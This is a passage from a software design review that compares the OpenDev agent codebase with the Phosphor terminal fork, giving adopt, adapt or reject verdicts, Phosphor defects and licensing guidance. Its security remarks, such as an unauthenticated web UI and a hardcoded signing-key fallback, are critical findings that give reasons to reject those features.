  `/api/sessions`, `/api/chat/query`, `/api/sessions/browse-directory` and `/ws` take
  no auth extractor. Registration is open (`auth.rs:213-247`).
- **The signing key has a hardcoded fallback**:
  `Err(_) => b"change-me-in-production"` (`crates/opendev-web/src/routes/auth.rs:62-66`),
  so on an unconfigured instance a valid cookie can be forged — which is moot, since
  nothing checks it.
- It binds `127.0.0.1:8080` by default (`crates/opendev-cli/src/cli.rs:238-243`), which
  is the one thing it gets right, but `--ui-host 0.0.0.0` exposes arbitrary agent
  execution and filesystem browsing on the host with a single flag.

**And the concept fails for Phosphor independently of the bugs.** `moth-parliament.md`
§4b Model A is explicit that credentials stay on the laptop and the transport is the
user's own SSH. A local HTTP server is a second network surface with its own auth
story, in a product whose `DESIGN-PHOSPHOR-FORK.md` §1 identity is "no accounts,
credentials local". Every argument for it is better served by SSH plus the TUI, which
needs no new endpoint and inherits the user's existing authentication.

The one genuinely reusable idea in the crate is the packaging — the React SPA is
compiled into the binary with `rust-embed` (`crates/opendev-web/src/embedded.rs:13-16`)
with a filesystem override for development. Note it, do not build on it.

### R6 — `opendev-channels` / Telegram delivery

Only one adapter exists — Telegram (`crates/opendev-channels/src/telegram/adapter.rs:23-26`);
there is no Slack, webhook, email or Discord adapter anywhere in `crates/`. The
router's session map and delivery contexts are in-memory only
(`crates/opendev-channels/src/router.rs:110-111`) and its sessions are not
`SessionManager` sessions — `resolve_session` mints its own `uuid[..12]`
(`router.rs:283-311`).

Reject on identity. A chat-app bridge means an outbound network dependency on a
third-party service, a bot token at rest, and an inbound control path into a process
that can run arbitrary shell commands. That is a different product from a local
terminal with local credentials. It also has no bearing on the surface question — see
§8, where its existence is the reason `moth-parliament.md` §4's `channel` evidence
needs correcting rather than extending.

### R7 — Multi-key rotation and the provider circuit breaker

OpenDev supports several API keys per provider, rotating on 429/401/402 with
status-keyed cooldowns (`crates/opendev-http/src/rotation.rs:1-24`), plus a
Closed/Open/HalfOpen circuit breaker with a 5-failure threshold
(`crates/opendev-http/src/circuit_breaker.rs:22-30,46-53`).

Reject both, for the same reason. These are load-management mechanisms for an agent
running unattended against rate-limited free tiers. Phosphor's user is sitting in
front of the terminal watching the block list, and its stated primary target is a
*local* model server (`DESIGN-PHOSPHOR-FORK.md` §1). When a local endpoint fails, the
right behaviour is to say so immediately; a circuit breaker's job is to hide the
failure and retry later, which for an interactive terminal means a command that
silently does nothing for 30 seconds. Multi-key rotation additionally multiplies the
secure-storage surface (`AgentProviderSecrets`) to solve a problem the target user
does not have.

**Revisit only if** unattended/background conversations become a real feature — at
which point the argument changes, and this entry should be re-read rather than cited.

### R8 — `opendev-history`'s storage model

Sessions are one `{id}.json` plus one `{id}.jsonl`
(`crates/opendev-history/src/session_manager/mod.rs:178`), listed from a single cached
`sessions-index.json` rewritten in full on every save
(`crates/opendev-history/src/index.rs:204-216`) which, if missing or corrupt, causes
`list_sessions` to return empty rather than rebuild
(`crates/opendev-history/src/listing.rs:44-46`). Search reads every session file and
does a lowercase substring match (`session_manager/operations.rs:192-229`). Their own
SQLite store is a stub with the schema written and no `rusqlite` dependency
(`crates/opendev-history/src/sqlite_store.rs:44-48`).

Phosphor already persists conversations to SQLite under `general.persist_conversations`
(`DESIGN-PHOSPHOR-FORK.md` §9) with a `project_rules` table and a persister
(`app/src/ai/project_rules_persister.rs:1-9`). Moving toward JSONL would be a
regression, and the destination OpenDev is heading for is where Phosphor already is.

**One idea inside it deserves a separate verdict** — see §5, AH6 on checkpointing,
where Phosphor solves the same problem differently and the difference is deliberate.

---

## 5. ALREADY HAVE

Where Phosphor solves the same problem, and which is better.

### AH1 — Model-per-role

Covered at length in §1. Phosphor: seven model slots plus ten prompt-override slots on
a named profile, provider carried alongside model
(`app/src/ai/execution_profiles/mod.rs:341-400`, `:235-292`;
`app/src/ai/byop_compaction/config.rs:36-40`). OpenDev: two wired slots, model-name
only, three advertised slots that are dead or removed. **Phosphor is better and the
gap is large.** Do not import their vocabulary; §6.1 and §6.2 are the improvements
actually available here.

### AH2 — The shell tool

Covered at §4, R1. Phosphor runs a real pty with interactive stdin and long-running
snapshots (`app/src/ai/agent_providers/tools/shell.rs:23-27`, `long_shell.rs:1-29`);
OpenDev runs `sh -c` per call with no way to read a background job's later output.
**Phosphor is better, and this is the product difference, not an implementation
detail.**

### AH3 — Symbol and codebase intelligence

OpenDev's `opendev-tools-lsp` does run real language servers over JSON-RPC with 18+
configured by extension (`crates/opendev-tools-lsp/src/handler.rs:57-96`,
`servers/configs.rs:10-115`) — that part is real. But what it calls a symbol index is a
**query cache**: keyed by `(workspace_root, query_string)` with a 5-minute TTL and no
filesystem watching or edit invalidation (`crates/opendev-tools-lsp/src/cache.rs:15-19,46-54`).
There is no persistent repo-wide table, no build step, no incremental update, and no
cross-session index. And `opendev-tools-symbol` — the crate whose name promises the
index — is four stubs returning `Ok(Vec::new())`
(`crates/opendev-tools-symbol/src/find_symbol.rs:57-61`, `find_references.rs:57-58`,
`rename.rs:54`, `replace_body.rs:70`), none implementing `BaseTool`, while
`crates/opendev-tools-core/src/policy.rs:20-42` still grants permissions for those
non-existent tools. The tool that does insert code around a symbol locates it by
scanning lines against a hardcoded 36-entry keyword list — `fn `, `pub struct `,
`def `, `class ` … (`crates/opendev-tools-impl/src/insert_symbol.rs:115-156`).

Phosphor has `crates/lsp`, `app/src/ai/codebase_auto_indexing.rs`,
`codebase_embeddings.rs`, `codebase_retrieval.rs`, `crates/repo_metadata`, and a
`search_codebase` tool gated behind an explicit opt-in with a documented reason
(`app/src/ai/execution_profiles/mod.rs:385-393`). **Phosphor is better by a wide
margin.** Nothing here to take.

### AH4 — MCP

Roughly comparable, with Phosphor ahead on one axis that matters. OpenDev has three
declared transports (`crates/opendev-mcp/src/config.rs:17-22`), of which **`Sse` is
not SSE** — "For now, use simple HTTP POST (full SSE streaming is a larger
implementation)" (`crates/opendev-mcp/src/transport/sse.rs:52-53`) — so it is
functionally two, and only stdio supports server-initiated notifications. Its
namespacing is lossy and collision-unsafe: `sanitize_mcp_name` maps every non-alnum
character to `_` (`crates/opendev-mcp/src/manager/mod.rs:49-59`), so `my.server` and
`my-server` collide, and `ToolRegistry::register` overwrites silently
(`crates/opendev-tools-core/src/registry/mod.rs:112-116`). Its health monitor exists
and has no production caller (`crates/opendev-mcp/src/manager/health/mod.rs:164`), and
after a server is dropped its bridge tools stay registered, so later calls fail with
`ServerNotFound` and there is no re-registration path (`manager/tools.rs:274-326`,
`health/restart.rs:51`).

Phosphor has stdio and HTTP transports plus an SSE transport module
(`app/src/ai/mcp/parsing.rs:61,80`, `app/src/ai/mcp/sse_transport/`), a reconnecting
peer (`app/src/ai/mcp/reconnecting_peer.rs`), file-based and templatable managers with
watchers, per-server logs, and per-server allow/deny lists on the profile
(`app/src/ai/execution_profiles/mod.rs:361-362`). **Phosphor is better on lifecycle and
on permissions.** The one thing worth a glance is OpenDev exposing MCP *prompts* as
invocable skills (`crates/opendev-mcp/src/manager/resources.rs:59`, consumed at
`crates/opendev-tools-impl/src/invoke_skill/mod.rs:158,199-200`) — a small, real
feature. Phosphor's `app/src/ai/mcp/manager.rs` has no `prompts` handling. Note it as a
possible small addition; it is not on the recommended list because MCP prompts are
rarely published in practice and the measurement has not been made.

### AH5 — TUI architecture

This is the most lopsided comparison in the review, and it runs the other way from
what the crate sizes suggest.

OpenDev's TUI is ratatui with a flat ~100-field `AppState`
(`crates/opendev-tui/src/app/state.rs:17-241`) and a single dirty flag driving
`terminal.draw` (`crates/opendev-tui/src/app/mod.rs:279-283`), with a generation-counter
line cache and hash-based partial rebuild on top
(`crates/opendev-tui/src/app/cache.rs:18-47`). It is well done for what it is.

Phosphor's TUI has three caching layers: a cell-level diff renderer that writes only
changed cells through crossterm inside a synchronized update
(`crates/warpui_core/src/runtime/renderer.rs:52-126`); a presenter that caches the
rendered element tree and re-renders only invalidated views, so a paint-only repaint
reuses the tree entirely (`crates/warpui_core/src/presenter/tui.rs:89-145,158-190`);
and a viewported list with a 20-row overhang band and per-block height caching
(`crates/warpui_core/src/elements/tui/viewported_list.rs:1-5`,
`crates/warp_tui/src/tui_block_list_viewport_source.rs:29,93-101`). Repaints are
deadline-scheduled rather than tick-driven
(`crates/warpui_core/src/presenter/tui.rs:61-65`). **Phosphor is substantially better.**

Individual widgets are a more even contest, and three OpenDev ideas are worth naming
even though none makes the recommended list:

- **The stall-coloured spinner** — blue under 3 s, orange 3–10 s, red beyond, measured
  from the last token (`crates/opendev-tui/src/widgets/conversation/spinner.rs:30-40`).
  Phosphor's `warping_indicator` already threads elapsed time and shows an `(Ns)`
  counter but uses one constant colour
  (`crates/warp_tui/src/warping_indicator.rs:155,171-177`;
  `crates/warp_tui/src/tui_builder.rs:352-354`). A cheap, honest signal for a product
  whose primary target is a local model that can stall. Small; not urgent.
- **Diff background tinting.** OpenDev tints added/removed line backgrounds
  (`crates/opendev-tui/src/widgets/conversation/diff.rs:154-184`); Phosphor's TUI sets
  foreground only (`crates/warp_tui/src/tui_builder.rs:164-175`). Purely cosmetic.
- **An MCP segment in the status bar.** OpenDev shows `MCP: n/total` persistently
  (`crates/opendev-tui/src/widgets/status_bar.rs:156-391`); Phosphor's
  `TuiStatuslineItem` has 13 configurable items and no MCP variant
  (`app/src/settings/ai.rs:629-651`), surfacing server state only inside the `/mcp`
  menu (`crates/warp_tui/src/mcp_menu.rs:322`). One enum variant.

Two OpenDev TUI features Phosphor lacks are **not** recommended. Scroll acceleration
(`crates/opendev-tui/src/app/tick.rs:8-30`) versus Phosphor's flat
`WHEEL_STEP: isize = 2` (`crates/warpui_core/src/elements/tui/scrollable.rs:19,139`) is
a matter of feel that should be decided by using it, not by reading someone else's
constant. And their leader key `Ctrl+X` with a chord table
(`crates/opendev-tui/src/app/key_handler.rs:486-529`) is *less* useful here than what
Phosphor already has half-built: the keymap matcher already supports multi-keystroke
sequences (`crates/warpui_core/src/keymap/matcher.rs:29-30,308-340`) and every TUI
binding already has a stable remappable name, but the TUI process never loads
`keybindings.yaml` — `load_custom_keybindings` is called only from the GUI launch path
(`app/src/keyboard.rs:35-60`, sole call site `app/src/lib.rs:2780`), a gap the code
itself documents as a follow-up (`crates/warp_tui/src/keybindings.rs:6-9`). **Finishing
that is worth more than adding a leader key**, and it is a pre-existing Phosphor TODO,
not an OpenDev idea. Recorded here because studying their keymap is what surfaced it.

### AH6 — Checkpointing and undo

OpenDev keeps before-images per file per session under
`~/.opendev/file-history/{session_id}/` with a manifest, `MAX_SNAPSHOTS = 100` and a
30-day retention (`crates/opendev-history/src/file_checkpoint.rs:9-13,24-28,335-377`),
plus a shadow git repository under `~/.opendev/snapshot/<project_id>/` that it `git gc
--prune`s (`crates/opendev-history/src/snapshot.rs:3-5,400`).

Phosphor solves this at a different granularity: individual agent edits can be
reverted, and revert state is tracked through conversation forking
(`app/src/ai/blocklist/inline_action/code_diff_view.rs:419`;
`app/src/ai/blocklist/history_model.rs:1695-1699`).

**Judged: keep Phosphor's, and do not build the shadow repository.** The honest gap is
real — a per-edit revert cannot undo what `run_shell_command` did, and in a terminal
that is most of what happens. But a shadow git repo mirroring the user's working tree
is a large, invisible side effect in a product whose stated premise is that the user
sees what runs (`DESIGN-PHOSPHOR-FORK.md` §9), and the user of a *terminal* already
has version control and knows how to use it. Building a second, hidden one to protect
them from their own shell is the wrong shape for this product. The right response to
the gap is the approval model (§2 T5, §3 TA4), not a snapshot store.

### AH7 — models.dev, cost accounting, and project rules

Three quick ones where both have it and Phosphor's is at least as good:

- **models.dev catalogue.** OpenDev caches `https://models.dev/api.json` with a 24 h
  TTL (`crates/opendev-config/src/models_dev/mod.rs:9-11`). Phosphor's is the one
  external metadata call the fork makes (`DESIGN-PHOSPHOR-FORK.md` §2). Parity.
- **Cost.** OpenDev computes from models.dev pricing
  (`crates/opendev-runtime/src/cost_tracker.rs:49-56`). Phosphor multiplies
  provider-reported tokens by *user-configured* rates and refuses to render an
  unconfigured model as `$0.00` (`app/src/ai/usage_cost.rs:19-31`). Phosphor's is more
  honest; OpenDev's is more automatic. The one thing worth taking is the budget, §2 T4.
- **Project rules.** OpenDev discovers instruction files and injects them into subagent
  prompts (`crates/opendev-agents/src/subagents/manager/spawn.rs:165-176`). Phosphor
  indexes `WARP.md` / `AGENTS.md` into a SQLite `project_rules` table with per-host
  storage for remote hosts (`app/src/ai/project_rules_persister.rs:1-9`;
  `app/src/ai/remote_agent_context.rs:48`). Phosphor's is better.

---

## 6. Problems in Phosphor's design that studying OpenDev exposed

These are worth fixing regardless of whether anything above is adopted. They are
listed here rather than filed because `AGENTS.md` §5.11 wants a defect issue per
problem and a review document is not that; each of these should become one.

### 6.1 — The role is reverse-engineered from the model id instead of carried

This is the finding I would most want acted on, and it is the exact inverse of
OpenDev's failure. OpenDev has a role-keyed lookup (`resolve_agent_role(role)`,
`crates/opendev-models/src/config/mod.rs:305`) that almost nothing calls. Phosphor has
seven roles that are all genuinely used and **no way to say which one a request is**.

The bridge is a model-identity match, and the code says so in its own doc comment:

```rust
// app/src/ai/execution_profiles/mod.rs:437-441
/// The BYOP chat path renders a single system prompt from `params.model`, so
/// we bridge role → slot by matching `model` against the profile's configured
/// slot models (most specific first, then `base` as the fallback slot). When
/// two slots point at the *same* model we can't tell them apart from the model
/// alone; the more specific slot wins, which is the sensible default.
```

The implementation walks `computer_use_model` → `cli_agent_model` → `coding_model` →
`base` and returns the first whose `LLMId` equals the request's
(`mod.rs:443-461`).

**Why this is a defect and not a shortcut.** The failure is silent and it is the
*common* configuration, not an exotic one. A user who sets `base_model` and
`coding_model` to the same model — because they only have one good model configured,
which is the normal BYOP starting state — has just made their `coding` prompt override
unreachable. It will never fire; `base` always wins the match. Nothing warns them. The
settings UI will happily show a `coding` override that has no effect.

**And the information is already there.** At the call site, the struct being built
carries the roles as separate fields:

```rust
// app/src/ai/agent/api.rs:611-613, then :629-632
let prompt_override = profile_data
    .agent_prompt_override_for_model(&request_input.model_id)
    .cloned();
…
model: request_input.model_id.clone(),
coding_model: request_input.coding_model_id.clone(),
cli_agent_model: request_input.cli_agent_model_id.clone(),
computer_use_model: request_input.computer_use_model_id.clone(),
```

The request knows which role it is. Twenty lines later the code throws that away and
guesses it back from the model id.

**The fix.** A `Role` enum threaded from the request through to prompt resolution —
`agent_prompt_override_for_role(role)` — with `agent_prompt_override_for_model` kept
only if some caller genuinely has a model and no role, and deprecated if not. This is
the *one* structural idea worth importing from OpenDev's side of §1: a role is a
first-class value, not something you infer.

**Scope note.** This touches `app/src/ai/agent/api.rs`,
`app/src/ai/execution_profiles/mod.rs`, and `chat_stream`'s
`render_system_with_override`. It is not large. The existing tests at
`app/src/ai/execution_profiles/mod.rs:676-722` assert the *current* matching behaviour
including the collision case, so they encode the bug and would need rewriting — which
is itself a small signal that the behaviour was reasoned about and accepted rather
than overlooked. It should be re-reasoned about now that the collision case is known
to be the default configuration.

### 6.2 — Slot ownership is split between the profile and global settings

Six model slots live on `AIExecutionProfile` (`app/src/ai/execution_profiles/mod.rs:366-378`).
The seventh — compaction — does not. It lives in global settings as two flat strings,
`byop_compaction_model_provider_id` and `byop_compaction_model_id`
(`app/src/settings/ai.rs:2697,2707`), converted into `CompactionModelRef` at
`app/src/ai/byop_compaction/config.rs:104-106`.

So a user who maintains a "cheap local" profile and an "expensive hosted" profile gets
per-profile control of six roles and one global setting for the seventh — and
compaction is arguably the role where the profile split matters most, since a local
profile wants a local summariser and a hosted profile probably does not.

Reading OpenDev is what made this visible, because OpenDev made the opposite
consolidation deliberately: its v1→v2 config migration *moves* `model_compact` out of
the flat namespace and into the per-agent map
(`crates/opendev-config/src/migration.rs:87-88,94-118`). They chose the layered home
and then failed to wire it (§1). Phosphor wired it and left it in the flat home. The
right answer is the union of the two: on the profile, and consumed.

**The fix is a migration, not a rewrite** — add `compaction_model: Option<LLMId>` to
the profile with `None` meaning "fall back to the global setting", then deprecate the
global one. `AIExecutionProfile` already carries `#[serde(default)]` and has absorbed
new fields before (`prompt_overrides` was added exactly this way, `mod.rs:396-398`).

### 6.3 — One global character cut for every tool result

`MAX_TOOL_RESPONSE_CHARS: usize = 40_000`
(`app/src/ai/agent_providers/chat_stream.rs:944`), applied identically to shell output,
file reads, grep results and MCP responses. The tree already documents the harm — it
"slices the serialized JSON mid-array and mid-path"
(`app/src/ai/agent_providers/tools/search.rs:150`) — and one tool has been fixed
locally, in isolation, with its own cap and a `truncated: true` marker
(`search.rs:215-216`).

The generalisation is §3, TA2. The reason it is repeated here is that it is a
**pre-existing defect with a known symptom**, not a feature request, and it should be
filed as one whether or not TA2's per-tool rules are adopted. The minimum fix is that
a cut is announced to the model; the better fix is that shell output is cut from the
head and file reads from the tail.

### 6.4 — Auto-approval rests on a boolean the model writes

Detailed at §3, TA4 with evidence at
`app/src/ai/blocklist/permissions.rs:957-963,983-990` and
`app/src/ai/agent_providers/tools/shell.rs:15-19`. Bounded by a denylist that is
checked first and by `execute_commands` defaulting to `AlwaysAsk`, so this is an
opted-into exposure and not a default one. File it as a defect; fix it together with
§2, T5, which gives the user the precise control they currently lack and which is the
reason the imprecise one gets used.

### 6.5 — There is no project-scoped configuration

Detailed at §2, T2. `crates/settings` knows one `settings.toml`. A terminal spans many
repositories in a session and the most valuable per-repository binding — which model
plays which role here — is unavailable. This is a gap, not a bug, and it is a branch
of its own.

### 6.6 — The TUI cannot load the user's keybindings

Not an OpenDev idea; a pre-existing Phosphor follow-up that studying OpenDev's keymap
surfaced. Every TUI binding already has a stable remappable name and the keymap matcher
already supports chords (`crates/warpui_core/src/keymap/matcher.rs:29-30,308-340`), but
`load_custom_keybindings` is only called from the GUI launch path
(`app/src/keyboard.rs:35-60`; sole call site `app/src/lib.rs:2780`). The TUI's own
header says so (`crates/warp_tui/src/keybindings.rs:6-9`). Worth more than any TUI
feature on this list.

---

## 7. Licensing and provenance

OpenDev is MIT — `LICENSE`, "Copyright (c) 2025-2026 OpenDev Contributors". Phosphor
is dual MIT / AGPL-3.0-only inherited from Warp, and because the shipped binary links
the AGPL `app` crate, **the distributed whole is AGPL**
(`docs/DESIGN-PHOSPHOR-FORK.md` §6).

MIT into AGPL is compatible in that direction. It is not free of obligation.

**If code were copied**, MIT's terms attach to the copied portion permanently and
travel with every distribution:

- The MIT copyright notice and permission text must be retained "in all copies or
  substantial portions of the Software". In practice that means a per-file header on
  any file containing derived code and an entry in whatever notice file the
  distribution carries. `DESIGN-PHOSPHOR-FORK.md` §6's "keep copyright/license notices
  intact" already states the rule; this would be a *new* third-party copyright entering
  a tree that currently has one (Denver Technologies) plus the vendored
  `lib/rust-genai`.
- The `crates/*` files that would host such code are AGPL. A file with an MIT header
  inside an AGPL crate is legally fine and organisationally confusing, and it means
  every later edit to that file has to remember which licence it is under.
- Provenance must be recorded the way cherry-picks already are — `DESIGN-PHOSPHOR-FORK.md`
  §7 requires `-x` provenance on picks; a copied file needs at least the upstream URL
  and commit (`d32c660e4eed1a8e988d1fd58da88e41ba641d08`).

**Recommendation: take no code.** Nothing on the recommended list needs it, and this
is not a convenience argument — it is what the evidence supports:

- **T1 (doom-loop)** is the closest call, because `doom_loop.rs` is small and
  self-contained. But its value is the *policy* — fingerprint tool calls, look for
  cycles up to length 3, escalate on the third — which is four sentences, and its data
  structures would have to be rewritten for Phosphor's tool-call types anyway.
- **T3 (hooks)** must be reimplemented regardless, since §2 T3 recommends changing three
  of its behaviours (fail loudly on bad regex, surface non-JSON stdout, await blocking
  hooks). Copying it would import the bugs.
- **T5, TA2, TA4, 6.1, 6.2** are all changes to existing Phosphor code with no OpenDev
  code to copy.
- **T2 (project config)** is a `crates/settings` change; OpenDev's loader is
  `serde_json` merging over a different config type entirely.

So the whole recommended list is ideas, and the licensing question does not arise. If
that changes — if someone later wants their diff parser or their edit-matcher chain —
it becomes a real decision requiring the notice work above, and it should be taken
deliberately rather than by drift.

**One thing to be careful about even with ideas.** Do not copy prose. OpenDev's
templates directory (`crates/opendev-agents/templates/`) contains 40-odd tool
description files and system prompts. Prompt text is copyrightable expression and is
the kind of thing that gets pasted without thinking because it "isn't code". Write our
own.

---

## 8. A correction to `moth-parliament.md` §4 and `DESIGN-PHOSPHOR-FORK.md` §9

Both documents cite OpenDev's session shape as prior art for treating the surface as a
field. `DESIGN-PHOSPHOR-FORK.md` §9 calls it "a stronger decoupling than the
'standalone pane' framing" and "the more useful idea". `moth-parliament.md` §4 repeats
the three fields and says "**The surface is a field, not an ancestor.**"

**The citation does not survive contact with the code.** Three specific claims are
wrong:

1. **`delivery_context` is dead.** Declared at
   `crates/opendev-models/src/session.rs:86`, it has **no readers and no writers**
   outside `opendev-models` and its own tests. The channel router keeps a *separate*,
   in-memory `delivery_contexts: HashMap<session_id, DeliveryContext>`
   (`crates/opendev-channels/src/router.rs:110-111`) which is never persisted, so
   delivery addressing does not survive a restart. The field on `Session` is a
   transcription artifact from the Python original, not a mechanism.

2. **`moth-parliament.md` §4 states that OpenDev "delivers to Slack, webhooks and a
   CLI, and an open set suits that". It does not.** There is exactly one
   `ChannelAdapter` implementation in the tree — Telegram
   (`crates/opendev-channels/src/telegram/adapter.rs:23-26`). No Slack adapter, no
   webhook adapter, no email adapter exists anywhere in `crates/`. `"cli"` and `"web"`
   appear only as channel *name strings* (`crates/opendev-channels/src/router.rs:18-20`,
   `crates/opendev-history/src/index.rs:61`) with no adapters registered for them. So
   the open set is not serving a diverse delivery fleet; it is serving one bot and two
   placeholder strings.

3. **The router does not use `Session` at all.** `resolve_session` mints its own
   ad-hoc `uuid[..12]` id rather than going through `SessionManager`
   (`crates/opendev-channels/src/router.rs:283-311`), so the router's "sessions" and
   the history crate's sessions are different objects. The abstraction the two
   Phosphor documents admired is not load-bearing even in its own codebase.

**What this does and does not change.**

It does **not** reopen step 4. `moth-parliament.md` §4's `Surface` decision already
rests on a Phosphor-native justification, stated there explicitly as a correction to an
earlier draft: "this is for surface independence within the app — Phosphor already
ships two surfaces, the GUI and `crates/warp_tui`". That argument is true, is about
this codebase, and does not depend on OpenDev being right. **The decision stands; only
its supporting citation is withdrawn.**

It *strengthens* the typed-enum departure, and for a better reason than the one
recorded. `moth-parliament.md` §4 justifies `Surface::{Gui,Tui}` over `channel: String`
by saying an open set "suits" OpenDev's diverse delivery targets and does not suit
Phosphor. The evidence says the open set does not suit OpenDev either — one adapter,
two dead strings, a field with no readers. So the departure is not a difference of
requirements; it is Phosphor declining to copy a mistake.

**And it argues against copying the rest of the struct.** `Session` also carries
`channel_user_id`, `chat_type` (defaulting to `"direct"`), and `owner_id`
(`crates/opendev-models/src/session.rs:83-85,98`) — vestiges of a multi-user, chat-app
server product. Phosphor's `DESIGN-PHOSPHOR-FORK.md` §1 identity is no accounts and no
server. Taking the shape wholesale would import a tenancy model this fork exists to not
have.

**Suggested action:** amend `moth-parliament.md` §4 to replace the `delivery_context`
citation with this section's finding, keeping the `Surface` decision and the
`working_directory` observation — which *is* well-founded, since
`Session::working_directory` is genuinely used, inherited on fork
(`crates/opendev-history/src/session_manager/operations.rs:88`) and carried into the
index (`crates/opendev-history/src/index.rs:165-167`). Do not amend it from this file;
`moth-parliament.md` is owned by the branch's delivery plan and should be edited
deliberately.

---

## 9. Summary of verdicts

| # | Item | Verdict | Cost | Touches |
|---|---|---|---|---|
| T1 | Doom-loop cycle detection with escalation | TAKE (idea) | S | `app/src/ai/blocklist/controller.rs` |
| T2 | Project-scoped config layer, allowlisted keys | TAKE (idea) | L, own branch | `crates/settings`, `execution_profiles` |
| T3 | Hook events at the tool boundary | TAKE (idea), 3 fixes | M | tools dispatch, `action_model.rs`, settings |
| T4 | Session cost budget | TAKE (idea) | S | `usage_cost.rs`, agent loop |
| T5 | "Don't ask again for this prefix, here" at the prompt | TAKE (idea) | S–M | `tui_permission_prompt.rs`, `requested_command.rs`, `permissions.rs` |
| TA1 | `SubAgentSpec` as a bundle: add tools + mode to the profile | ADAPT — provider must travel with model | M | `execution_profiles/` |
| TA2 | Per-tool truncation rules (head/tail) | ADAPT — no overflow files | S | `chat_stream.rs:944`, `tools/mod.rs` |
| TA3 | Deferred tool schemas + a search tool | ADAPT — gate on context window; **measure first** | M | tool schema assembly |
| TA4 | Compute `is_read_only`; model's word is a hint only | ADAPT — file as a defect | S | `permissions.rs` `AgentDecides` arm |
| R1 | `sh -c` per tool call | REJECT — the pty block list is the product | — | — |
| R2 | `opendev-sandbox` | REJECT — stub, and wrong shape | — | — |
| R3 | Worktree isolation for agents | REJECT for now — hides work from the user's shell | — | — |
| R4 | `opendev-plugins` | REJECT — no implementation slot; MCP + skills fill it | — | — |
| R5 | The web UI | REJECT — unauthenticated by construction; second network surface | — | — |
| R6 | Telegram / channels | REJECT — outbound dependency, token at rest, inbound shell | — | — |
| R7 | Key rotation, circuit breaker | REJECT — unattended-agent mechanisms; revisit if that changes | — | — |
| R8 | JSONL history + index file | REJECT — Phosphor's SQLite is the destination they want | — | — |
| AH1 | Model-per-role | ALREADY HAVE, better (7 slots + provider + 10 prompt slots) | — | — |
| AH2 | Shell execution | ALREADY HAVE, better (real pty, interactive, long-running) | — | — |
| AH3 | Symbol / codebase index | ALREADY HAVE, much better | — | — |
| AH4 | MCP | ALREADY HAVE, better lifecycle & permissions; MCP *prompts* a maybe | — | — |
| AH5 | TUI architecture | ALREADY HAVE, substantially better | — | — |
| AH6 | Checkpoint / undo | ALREADY HAVE differently; deliberately no shadow repo | — | — |
| AH7 | models.dev, cost, project rules | ALREADY HAVE, parity or better | — | — |

### The three to act on first

1. **§6.1 — thread the role through instead of matching on the model id.** A silent
   misconfiguration in the most common BYOP setup, with the correct information
   already present twenty lines from where it is discarded.
2. **§3 TA4 + §2 T5 together — fix auto-approval from both sides.** Stop the model
   deciding its own command is safe; give the user the narrow "don't ask again for
   `cargo ` here" they currently have to reach through a regex in settings, so the
   blunt model-trusting toggle stops being the easy path.
3. **§2 T1 — doom-loop detection.** Small, self-contained, and aimed squarely at the
   fork's declared primary target: small local models, in a product where every wasted
   iteration writes a visible block.

### The tempting thing to reject

**The web UI.** It looks like the answer to "view a conversation running on another
machine", which `moth-parliament.md` §4a wanted and could not have. It is not: it has
no working authentication (`crates/opendev-web/src/routes/auth.rs:62-66` and
`crates/opendev-web/src/server.rs:50`), it is a second network surface in a
credentials-local product, and every job it does is done better by SSH plus the TUI —
which is Model A in `moth-parliament.md` §4b and needs no new endpoint at all.

Runner-up: **`opendev-sandbox`**, which is tempting purely because of its name, and is
an empty crate that does not compile off Linux.

